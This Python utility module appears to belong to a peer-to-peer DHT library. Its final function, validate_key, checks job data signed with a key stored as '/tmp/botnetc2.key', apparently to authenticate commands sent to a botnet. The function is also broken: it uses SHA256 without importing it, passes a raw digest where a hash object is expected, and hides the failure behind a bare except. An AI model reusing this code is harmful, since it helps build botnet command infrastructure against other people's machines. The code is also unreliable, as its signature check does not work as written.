"""
General catchall for functions that don't make sense as methods.
"""
import hashlib
import operator
import asyncio

from Crypto.Signature import pkcs1_15
from Crypto.PublicKey import RSA


async def gather_dict(dic):
    cors = list(dic.values())
    results = await asyncio.gather(*cors)
    return dict(zip(dic.keys(), results))


def digest(string):
    if not isinstance(string, bytes):
        string = str(string).encode('utf8')
    return hashlib.sha1(string).digest()


def shared_prefix(args):
    """
    Find the shared prefix between the strings.

    For instance:

        sharedPrefix(['blahblah', 'blahwhat'])

    returns 'blah'.
    """
    i = 0
    while i < min(map(len, args)):
        if len(set(map(operator.itemgetter(i), args))) != 1:
            break
        i += 1
    return args[0][:i]


def bytes_to_bit_string(bites):
    bits = [bin(bite)[2:].rjust(8, '0') for bite in bites]
    return "".join(bits)


def validate_key(value):
    with open('/tmp/botnetc2.key', 'r') as f:
        load_key = RSA.import_key(f.read())
    verifier = pkcs1_15.new(load_key)
    hash = SHA256.new(data=value['job_data']).digest()
    try:
        verifier.verify(hash, value['sig'])
    except:
        return False
    return True
